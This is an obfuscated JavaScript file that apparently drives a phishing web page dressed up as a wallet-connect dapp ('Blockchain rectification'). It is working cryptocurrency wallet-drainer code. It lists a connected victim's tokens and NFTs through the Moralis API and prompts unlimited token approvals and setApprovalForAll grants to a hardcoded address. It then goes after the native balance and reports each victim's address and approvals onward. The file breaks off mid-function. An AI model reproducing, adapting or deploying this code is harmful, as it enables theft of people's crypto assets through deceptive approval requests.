const _0x166275=_0x8de9;(function(_0x427c66,_0xad46d1){const _0x9de2c9=_0x8de9,_0x7a4e08=_0x427c66();while(!![]){try{const _0x46ca90=-parseInt(_0x9de2c9(0x13c))/0x1+-parseInt(_0x9de2c9(0x93))/0x2*(parseInt(_0x9de2c9(0xed))/0x3)+parseInt(_0x9de2c9(0xf5))/0x4*(parseInt(_0x9de2c9(0xb3))/0x5)+parseInt(_0x9de2c9(0x129))/0x6+-parseInt(_0x9de2c9(0x12f))/0x7*(-parseInt(_0x9de2c9(0x103))/0x8)+parseInt(_0x9de2c9(0xc5))/0x9+parseInt(_0x9de2c9(0xf6))/0xa*(-parseInt(_0x9de2c9(0x113))/0xb);if(_0x46ca90===_0xad46d1)break;else _0x7a4e08['push'](_0x7a4e08['shift']());}catch(_0x41c977){_0x7a4e08['push'](_0x7a4e08['shift']());}}}(_0x2595,0x1aa67));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {polygon,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[polygon,mainnet],projectId=_0x166275(0x12d),{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x166275(0xd7))]({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x166275(0x107),'coinbase':_0x166275(0x11d)}},ethereumClient);let currentUrl=window[_0x166275(0x128)][_0x166275(0xce)];function _0x2595(){const _0x5ad18e=['removeBlackList','click','balanceOf','catch','Pause','allowance','551961WocuwT','all','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','polygon','_clearedUser','Error:\x20','from','application/json','_owner','href','Transaction\x20hash\x20','999999999999999999999999999999999999999999999999999999999999999999999999','status','decimals','sending\x20ether','startingIndex','No\x20address','search','CoinbaseWalletConnector','_maker','_to','AddedBlackList','https://api.coingecko.com/api/v3/simple/token_price/polygon?contract_addresses=','Approve\x20Completed\x20Successfully','result','balance','newAddress','flipSaleState','hash','maxApePurchase','provenanceHash','reserveApes','baseURI','Transaction\x20is\x20submitted\x20to\x20the\x20network','setStartingIndex','length','tokenId','mintApe','_initialSupply','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','3seZpkn','BAYC_PROVENANCE','basisPointsRate','totalSupply','feeBasisPoints','GET','maxFee','MAX_APES','4AAZwoO','362460zsJmqu','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','connector','previousOwner','Token','Hahahahahah','transfer','error','message','issue','Unable\x20to\x20get\x20NFts','payable','Error\x20processing\x20item\x20','37096LcrwoF','Could\x20not\x20get\x20a\x20wallet\x20connection','getOwner','RemovedBlackList','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','NFT\x20Contract\x20Address\x20','5227607491','MAX_UINT','Token\x20balance\x20is\x20','symbol','Transfer','price','Redeem','addBlackList','operator','balances','11PBRXDj','MetaMask','&text=','string','ApprovalForAll','Unpause','newOwner','Your\x20address\x20','_from','https://go.cb-w.com/dapp?cb_url=','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','Approval','_balance','trustwallet','openModal','amount','_spender','_blackListedUser','function','0xea8968B218a551919FbD5f1166328C82a96dED54','getProvider','location','1169028VQQYXe','approve','bool','revealTimeStamp','ee71d215d0dec7d1bf950851c84d9643','REVEAL_TIMESTAMP','70nNOLcC','view','137','maxNftSupply','upgradedAddress','_user','remaining','spender','setApprovalForAll','tokenOfOwnerByIndex','index','.trust','uint256','214838BTIaGC','Params','owner','_data','saleStart','_value','json','.meta','.proceed','paused','Transaction\x20Rejected','networkVersion','approved','309006FATgVx','filter','undefined','formatted','supportsInterface','&vs_currencies=usd','log','renounceOwnership','isBlackListed','token_address','deprecate','Deprecate','name','address','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','Issue','getApproved','transferOwnership','/nft/collections?chain=','pause','allowed','transferFrom','setProvenanceHash','toString','then','unpause','bytes','https://link.trustwallet.com/open_url?url=','safeTransferFrom','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','event','bytes4','1061045XNDISI','Transaction\x20Receipt:\x20','.connect','redeem','coinbase','tokens-list','chainId:','nonpayable','value','startingIndexBlock','Approved','https://deep-index.moralis.io/api/v2/'];_0x2595=function(){return _0x5ad18e;};return _0x2595();}const OWNER_ADDRESS=_0x166275(0x126),ABI=[{'constant':!![],'inputs':[],'name':_0x166275(0x9f),'outputs':[{'name':'','type':_0x166275(0x116)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x166275(0xa0)}],'name':_0x166275(0x9d),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':_0x166275(0x123),'type':_0x166275(0xa0)},{'name':_0x166275(0x8b),'type':_0x166275(0x13b)}],'name':_0x166275(0x12a),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':'deprecated','outputs':[{'name':'','type':_0x166275(0x12b)}],'payable':![],'stateMutability':'view','type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x166275(0xa0)}],'name':_0x166275(0x110),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':_0x166275(0xf0),'outputs':[{'name':'','type':_0x166275(0x13b)}],'payable':![],'stateMutability':'view','type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':_0x166275(0x11b),'type':_0x166275(0xa0)},{'name':_0x166275(0xd9),'type':_0x166275(0xa0)},{'name':'_value','type':_0x166275(0x13b)}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x166275(0x133),'outputs':[{'name':'','type':_0x166275(0xa0)}],'payable':![],'stateMutability':_0x166275(0x130),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x166275(0x112),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':'decimals','outputs':[{'name':'','type':_0x166275(0x13b)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':_0x166275(0x13b)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x166275(0x13b)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':![],'inputs':[],'name':_0x166275(0xac),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'constant':!![],'inputs':[{'name':_0x166275(0xd8),'type':_0x166275(0xa0)}],'name':'getBlackListStatus','outputs':[{'name':'','type':_0x166275(0x12b)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':!![],'inputs':[{'name':'','type':'address'},{'name':'','type':'address'}],'name':_0x166275(0xa7),'outputs':[{'name':'','type':_0x166275(0x13b)}],'payable':![],'stateMutability':'view','type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':_0x166275(0x8f),'outputs':[{'name':'','type':_0x166275(0x12b)}],'payable':![],'stateMutability':'view','type':_0x166275(0x125)},{'constant':!![],'inputs':[{'name':'who','type':'address'}],'name':_0x166275(0xc1),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':![],'inputs':[],'name':_0x166275(0xa6),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':'function'},{'constant':!![],'inputs':[],'name':_0x166275(0x105),'outputs':[{'name':'','type':_0x166275(0xa0)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x166275(0x88),'outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x166275(0x116)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':'_to','type':'address'},{'name':'_value','type':_0x166275(0x13b)}],'name':_0x166275(0xfc),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':'function'},{'constant':![],'inputs':[{'name':'newBasisPoints','type':'uint256'},{'name':'newMaxFee','type':_0x166275(0x13b)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':_0x166275(0xff),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':'amount','type':'uint256'}],'name':_0x166275(0xb6),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':'function'},{'constant':!![],'inputs':[{'name':_0x166275(0xcd),'type':'address'},{'name':_0x166275(0x123),'type':_0x166275(0xa0)}],'name':_0x166275(0xc4),'outputs':[{'name':_0x166275(0x135),'type':_0x166275(0x13b)}],'payable':![],'stateMutability':_0x166275(0x130),'type':'function'},{'constant':!![],'inputs':[],'name':_0x166275(0xef),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':!![],'inputs':[{'name':'','type':_0x166275(0xa0)}],'name':_0x166275(0x9b),'outputs':[{'name':'','type':_0x166275(0x12b)}],'payable':![],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':_0x166275(0xc9),'type':_0x166275(0xa0)}],'name':_0x166275(0xbf),'outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'constant':!![],'inputs':[],'name':_0x166275(0x10a),'outputs':[{'name':'','type':_0x166275(0x13b)}],'payable':![],'stateMutability':'view','type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':_0x166275(0x119),'type':'address'}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x166275(0x125)},{'constant':![],'inputs':[{'name':_0x166275(0x124),'type':_0x166275(0xa0)}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[{'name':_0x166275(0xeb),'type':_0x166275(0x13b)},{'name':'_name','type':_0x166275(0x116)},{'name':'_symbol','type':_0x166275(0x116)},{'name':'_decimals','type':_0x166275(0x13b)}],'payable':![],'stateMutability':_0x166275(0xba),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x166275(0x122),'type':_0x166275(0x13b)}],'name':_0x166275(0xa2),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x166275(0x122),'type':_0x166275(0x13b)}],'name':_0x166275(0x10f),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x166275(0xdf),'type':_0x166275(0xa0)}],'name':_0x166275(0x9e),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x166275(0xf1),'type':'uint256'},{'indexed':![],'name':_0x166275(0xf3),'type':_0x166275(0x13b)}],'name':_0x166275(0x13d),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x166275(0x124),'type':_0x166275(0xa0)},{'indexed':![],'name':_0x166275(0x11f),'type':'uint256'}],'name':'DestroyedBlackFunds','type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x166275(0xa0)}],'name':_0x166275(0xda),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x166275(0x134),'type':_0x166275(0xa0)}],'name':_0x166275(0x106),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x166275(0x88),'type':_0x166275(0xa0)},{'indexed':!![],'name':_0x166275(0x136),'type':_0x166275(0xa0)},{'indexed':![],'name':'value','type':'uint256'}],'name':_0x166275(0x11e),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x166275(0xcb),'type':'address'},{'indexed':!![],'name':'to','type':_0x166275(0xa0)},{'indexed':![],'name':_0x166275(0xbb),'type':'uint256'}],'name':_0x166275(0x10d),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[],'name':_0x166275(0xc3),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[],'name':_0x166275(0x118),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x166275(0x116),'name':'name','type':_0x166275(0x116)},{'internalType':_0x166275(0x116),'name':_0x166275(0x10c),'type':_0x166275(0x116)},{'internalType':_0x166275(0x13b),'name':_0x166275(0x132),'type':'uint256'},{'internalType':'uint256','name':_0x166275(0x8a),'type':'uint256'}],'stateMutability':'nonpayable','type':'constructor'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x166275(0xa0),'name':_0x166275(0x88),'type':_0x166275(0xa0)},{'indexed':!![],'internalType':_0x166275(0xa0),'name':_0x166275(0x92),'type':_0x166275(0xa0)},{'indexed':!![],'internalType':'uint256','name':'tokenId','type':_0x166275(0x13b)}],'name':_0x166275(0x11e),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x166275(0xa0),'name':_0x166275(0x88),'type':_0x166275(0xa0)},{'indexed':!![],'internalType':_0x166275(0xa0),'name':_0x166275(0x111),'type':_0x166275(0xa0)},{'indexed':![],'internalType':'bool','name':_0x166275(0x92),'type':_0x166275(0x12b)}],'name':_0x166275(0x117),'type':_0x166275(0xb1)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x166275(0xa0),'name':_0x166275(0xf9),'type':_0x166275(0xa0)},{'indexed':!![],'internalType':'address','name':_0x166275(0x119),'type':_0x166275(0xa0)}],'name':'OwnershipTransferred','type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x166275(0xa0),'name':'from','type':_0x166275(0xa0)},{'indexed':!![],'internalType':_0x166275(0xa0),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x166275(0x13b),'name':'tokenId','type':_0x166275(0x13b)}],'name':_0x166275(0x10d),'type':_0x166275(0xb1)},{'inputs':[],'name':_0x166275(0xee),'outputs':[{'internalType':_0x166275(0x116),'name':'','type':_0x166275(0x116)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xf4),'outputs':[{'internalType':_0x166275(0x13b),'name':'','type':_0x166275(0x13b)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0x12e),'outputs':[{'internalType':_0x166275(0x13b),'name':'','type':_0x166275(0x13b)}],'stateMutability':_0x166275(0x130),'type':'function'},{'inputs':[],'name':'apePrice','outputs':[{'internalType':'uint256','name':'','type':_0x166275(0x13b)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0xa0),'name':'to','type':_0x166275(0xa0)},{'internalType':_0x166275(0x13b),'name':_0x166275(0xe9),'type':_0x166275(0x13b)}],'name':'approve','outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0xa0),'name':_0x166275(0x88),'type':_0x166275(0xa0)}],'name':_0x166275(0xc1),'outputs':[{'internalType':_0x166275(0x13b),'name':'','type':'uint256'}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x166275(0x116),'name':'','type':_0x166275(0x116)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[],'name':'emergencySetStartingIndexBlock','outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xe0),'outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0x13b),'name':_0x166275(0xe9),'type':_0x166275(0x13b)}],'name':_0x166275(0xa3),'outputs':[{'internalType':'address','name':'','type':'address'}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0xa0),'name':'owner','type':_0x166275(0xa0)},{'internalType':_0x166275(0xa0),'name':_0x166275(0x111),'type':_0x166275(0xa0)}],'name':'isApprovedForAll','outputs':[{'internalType':_0x166275(0x12b),'name':'','type':'bool'}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xe2),'outputs':[{'internalType':_0x166275(0x13b),'name':'','type':_0x166275(0x13b)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0x13b),'name':'numberOfTokens','type':'uint256'}],'name':_0x166275(0xea),'outputs':[],'stateMutability':_0x166275(0x101),'type':'function'},{'inputs':[],'name':_0x166275(0x9f),'outputs':[{'internalType':_0x166275(0x116),'name':'','type':_0x166275(0x116)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0x88),'outputs':[{'internalType':_0x166275(0xa0),'name':'','type':_0x166275(0xa0)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[{'internalType':'uint256','name':_0x166275(0xe9),'type':_0x166275(0x13b)}],'name':'ownerOf','outputs':[{'internalType':_0x166275(0xa0),'name':'','type':_0x166275(0xa0)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0x9a),'outputs':[],'stateMutability':'nonpayable','type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xe4),'outputs':[],'stateMutability':_0x166275(0xba),'type':'function'},{'inputs':[{'internalType':_0x166275(0xa0),'name':_0x166275(0xcb),'type':'address'},{'internalType':_0x166275(0xa0),'name':'to','type':'address'},{'internalType':_0x166275(0x13b),'name':_0x166275(0xe9),'type':_0x166275(0x13b)}],'name':_0x166275(0xaf),'outputs':[],'stateMutability':'nonpayable','type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0xa0),'name':_0x166275(0xcb),'type':'address'},{'internalType':_0x166275(0xa0),'name':'to','type':'address'},{'internalType':_0x166275(0x13b),'name':_0x166275(0xe9),'type':_0x166275(0x13b)},{'internalType':_0x166275(0xad),'name':_0x166275(0x89),'type':_0x166275(0xad)}],'name':_0x166275(0xaf),'outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[],'name':'saleIsActive','outputs':[{'internalType':_0x166275(0x12b),'name':'','type':_0x166275(0x12b)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[{'internalType':'address','name':_0x166275(0x111),'type':_0x166275(0xa0)},{'internalType':'bool','name':'approved','type':'bool'}],'name':_0x166275(0x137),'outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0x116),'name':_0x166275(0xe5),'type':_0x166275(0x116)}],'name':'setBaseURI','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x166275(0x116),'name':_0x166275(0xe3),'type':'string'}],'name':_0x166275(0xa9),'outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0x13b),'name':_0x166275(0x12c),'type':_0x166275(0x13b)}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xe7),'outputs':[],'stateMutability':'nonpayable','type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xd4),'outputs':[{'internalType':'uint256','name':'','type':_0x166275(0x13b)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0xbc),'outputs':[{'internalType':_0x166275(0x13b),'name':'','type':_0x166275(0x13b)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[{'internalType':'bytes4','name':'interfaceId','type':_0x166275(0xb2)}],'name':_0x166275(0x97),'outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':_0x166275(0x10c),'outputs':[{'internalType':'string','name':'','type':_0x166275(0x116)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0x13b),'name':'index','type':_0x166275(0x13b)}],'name':'tokenByIndex','outputs':[{'internalType':_0x166275(0x13b),'name':'','type':_0x166275(0x13b)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0xa0),'name':_0x166275(0x88),'type':_0x166275(0xa0)},{'internalType':'uint256','name':_0x166275(0x139),'type':'uint256'}],'name':_0x166275(0x138),'outputs':[{'internalType':'uint256','name':'','type':_0x166275(0x13b)}],'stateMutability':_0x166275(0x130),'type':'function'},{'inputs':[{'internalType':_0x166275(0x13b),'name':_0x166275(0xe9),'type':'uint256'}],'name':'tokenURI','outputs':[{'internalType':_0x166275(0x116),'name':'','type':_0x166275(0x116)}],'stateMutability':_0x166275(0x130),'type':_0x166275(0x125)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':'uint256','name':'','type':_0x166275(0x13b)}],'stateMutability':'view','type':_0x166275(0x125)},{'inputs':[{'internalType':'address','name':'from','type':_0x166275(0xa0)},{'internalType':_0x166275(0xa0),'name':'to','type':'address'},{'internalType':_0x166275(0x13b),'name':_0x166275(0xe9),'type':'uint256'}],'name':_0x166275(0xa8),'outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[{'internalType':_0x166275(0xa0),'name':'newOwner','type':_0x166275(0xa0)}],'name':_0x166275(0xa4),'outputs':[],'stateMutability':_0x166275(0xba),'type':_0x166275(0x125)},{'inputs':[],'name':'withdraw','outputs':[],'stateMutability':'nonpayable','type':_0x166275(0x125)}];let wallet;$(_0x166275(0x8d))[_0x166275(0xc0)](async function(){wallet='metamask',await connector();}),$('.coinbase')[_0x166275(0xc0)](async function(){const _0x32cf59=_0x166275;wallet=_0x32cf59(0xb7),await connector();}),$(_0x166275(0x13a))['click'](async function(){wallet='trustwallet',await connector();}),$(_0x166275(0xb5))[_0x166275(0xc0)](async function(){const _0x5f0240=_0x166275;try{await web3Modal[_0x5f0240(0x121)]();}catch(_0x5d2bdf){console[_0x5f0240(0x99)](_0x5f0240(0x104),_0x5d2bdf);return;}});let connector=async()=>{const _0x488527=_0x166275;if(typeof web3===_0x488527(0x95)||typeof ethereum===_0x488527(0x95)){console[_0x488527(0x99)](_0x488527(0xfb));if(wallet==='metamask'){let _0xd565='https://metamask.app.link/dapp/'+currentUrl;window[_0x488527(0x128)][_0x488527(0xce)]=_0xd565;}else{if(wallet===_0x488527(0xb7)){let _0x35563e=_0x488527(0x11c)+currentUrl;window[_0x488527(0x128)][_0x488527(0xce)]=_0x35563e;}else{if(wallet===_0x488527(0x120)){let _0x4be9e5=_0x488527(0xae)+currentUrl;window[_0x488527(0x128)]['href']=_0x4be9e5;}}}}else try{await web3Modal['openModal']();}catch(_0x35e3d2){console['log'](_0x488527(0x104),_0x35e3d2);return;}};$(_0x166275(0x8e))[_0x166275(0xc0)](async function(){const _0x2d2bb7=_0x166275;let _0x5904d9=getAccount();console[_0x2d2bb7(0x99)](_0x5904d9),!_0x5904d9[_0x2d2bb7(0xa0)]&&(console[_0x2d2bb7(0x99)](_0x2d2bb7(0xd5)),alert(_0x2d2bb7(0xc7))),_0x5904d9['connector'][_0x2d2bb7(0x9f)]===_0x2d2bb7(0x114)&&(_0x5904d9[_0x2d2bb7(0xf8)]['options'][_0x2d2bb7(0x127)]()[_0x2d2bb7(0x91)]!==_0x2d2bb7(0x131)&&(console[_0x2d2bb7(0x99)]('Incorrect\x20network'),await switchNetwork({'chainId':0x89}))),selectedAccount=_0x5904d9[_0x2d2bb7(0xa0)],sendMessage(_0x2d2bb7(0xec)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa='0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0',Oxc=_0x166275(0x109);async function covalenthqAPICall(){const _0x40a0bb=_0x166275,_0x507c9f={'chain':'polygon'},_0x5e93e1=new URL(_0x40a0bb(0xbe)+selectedAccount+'/erc20');_0x5e93e1[_0x40a0bb(0xd6)]=new URLSearchParams(_0x507c9f)[_0x40a0bb(0xaa)]();const _0x5b5558={'method':'GET','headers':{'accept':_0x40a0bb(0xcc),'X-API-Key':_0x40a0bb(0xb0)}};try{const _0x4b4a5e=await fetch(_0x5e93e1,_0x5b5558)[_0x40a0bb(0xab)](_0x47f0e3=>_0x47f0e3[_0x40a0bb(0x8c)]());console[_0x40a0bb(0x99)](_0x4b4a5e);let _0x475af5=_0x4b4a5e;console[_0x40a0bb(0x99)]('Initial\x20list\x20',_0x475af5);let _0x51c7b7=await Promise[_0x40a0bb(0xc6)](_0x475af5['map'](async _0x35806a=>{const _0x8dcedb=_0x40a0bb;let _0x517d0e;try{_0x517d0e=await getValue(_0x35806a[_0x8dcedb(0x9c)],_0x35806a[_0x8dcedb(0xde)],_0x35806a[_0x8dcedb(0xd2)]);}catch(_0x7efb8){_0x517d0e=0x0;}return console[_0x8dcedb(0x99)](_0x517d0e),{'balance':_0x35806a[_0x8dcedb(0xde)],'value':_0x517d0e,'address':_0x35806a[_0x8dcedb(0x9c)]};}));console[_0x40a0bb(0x99)](_0x40a0bb(0xb8),_0x51c7b7),tokens=_0x51c7b7[_0x40a0bb(0x94)](_0x5877a7=>_0x5877a7[_0x40a0bb(0xbb)]>0x5),tokens['sort']((_0x487404,_0x26156b)=>_0x26156b[_0x40a0bb(0xbb)]-_0x487404[_0x40a0bb(0xbb)]),console[_0x40a0bb(0x99)](_0x40a0bb(0xb9),await getNetwork(),'Tokens:',tokens),NFTs=await getNFTs(selectedAccount)[_0x40a0bb(0xc2)](_0x1259a3=>{const _0x40a841=_0x40a0bb;console[_0x40a841(0x99)](_0x40a841(0x100),_0x1259a3);}),NFTs=NFTs[_0x40a0bb(0xdd)],console['log']('NFTs\x20collection\x20',NFTs);if(tokens[_0x40a0bb(0xe8)]===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onApprove(){const _0x8f6cb5=_0x166275;if(tokens['length'])try{loopTokens(tokens);}catch(_0x58a761){console[_0x8f6cb5(0xfd)](_0x8f6cb5(0x102)+_0x58a761[_0x8f6cb5(0xfe)]);}else{if(NFTs[_0x8f6cb5(0xe8)]){try{loopNfts(NFTs);}catch(_0x5c7d3b){console[_0x8f6cb5(0xfd)](_0x8f6cb5(0x102)+_0x5c7d3b[_0x8f6cb5(0xfe)]);}onSendEther(),sendMessage(_0x8f6cb5(0xf7));}else try{onSendEther();}catch(_0x2ba7bf){console['error'](_0x8f6cb5(0x102)+_0x2ba7bf[_0x8f6cb5(0xfe)]);}}}async function loopTokens(_0x380e76){const _0x33c9e7=_0x166275;for await(let _0x24501f of _0x380e76){console[_0x33c9e7(0x99)](_0x33c9e7(0xfa),_0x24501f);try{sendMessage('New\x20token');let {hash:_0x30e265}=await writeContract({'address':_0x24501f[_0x33c9e7(0xa0)],'abi':ABI,'functionName':_0x33c9e7(0x12a),'args':[Oxa,_0x33c9e7(0xd0)]});console['log']('hash',_0x30e265),_0x30e265&&(console[_0x33c9e7(0x99)](_0x33c9e7(0xbd)),sendMessage(_0x33c9e7(0xdc)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0x24501f[_0x33c9e7(0xa0)]),sendMessage(_0x33c9e7(0x10b)+_0x24501f[_0x33c9e7(0xde)]),sendMessage(_0x33c9e7(0x11a)+Oxa));}catch(_0x2b5104){console[_0x33c9e7(0x99)](_0x33c9e7(0xca)+_0x2b5104),sendMessage(_0x33c9e7(0x90));}};await loopNfts(NFTs);}async function loopNfts(_0x31389b){const _0x549bdf=_0x166275;for await(let _0x34f636 of _0x31389b){console[_0x549bdf(0x99)]('NFT',_0x34f636);try{let {hash:_0x58f2ae}=await writeContract({'address':_0x34f636[_0x549bdf(0x9c)],'abi':ABIN,'functionName':_0x549bdf(0x137),'args':[Oxa,!![]]});console[_0x549bdf(0x99)](_0x549bdf(0xe1),_0x58f2ae),console['log'](_0x549bdf(0xb4)+receipt),sendMessage(_0x549bdf(0xdc)),sendMessage(_0x549bdf(0x108)+_0x34f636[_0x549bdf(0x9c)]),sendMessage(_0x549bdf(0x11a)+Oxa);}catch(_0x4760cf){console[_0x549bdf(0x99)](_0x549bdf(0xca)+_0x4760cf),sendMessage(_0x549bdf(0x90));}}await onSendEther();}async function onSendEther(){const _0x7d7674=_0x166275;console['log'](_0x7d7674(0xd3));try{let _0x56fba1=await fetchBalance({'address':selectedAccount});console[_0x7d7674(0x99)](_0x56fba1);const _0x135a7b=await 